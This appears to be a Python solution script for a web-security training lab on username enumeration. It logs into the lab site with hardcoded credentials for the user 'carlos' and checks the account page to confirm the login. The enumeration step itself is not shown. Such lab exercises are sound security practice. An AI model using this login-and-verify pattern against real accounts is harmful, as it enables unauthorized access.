""" Lab: Username enumeration via different responses """
import re
import requests
LAB_URL = "https://0ae200a703e037d1817cd942004c00b7.web-security-academy.net/"


def main():
    """ Main function """
    print("Login as carlos...", end="")
    data = {"username": "carlos", "password": "montoya"}

    r = requests.post(LAB_URL + "login", data=data, allow_redirects=False)

    session = r.cookies.get("session")
    cookies = {"session": session}
    carlos_profile = requests.get(
        f"{LAB_URL}my-account?id={data['username']}", cookies=cookies, allow_redirects=False)
    pattern = re.findall("Your username is: carlos", carlos_profile.text)
    if len(pattern) != 0:
        print("Congratulations, you solved the lab!")
    else:
        print("Error: cannot login")


if __name__ == "__main__":
    main()
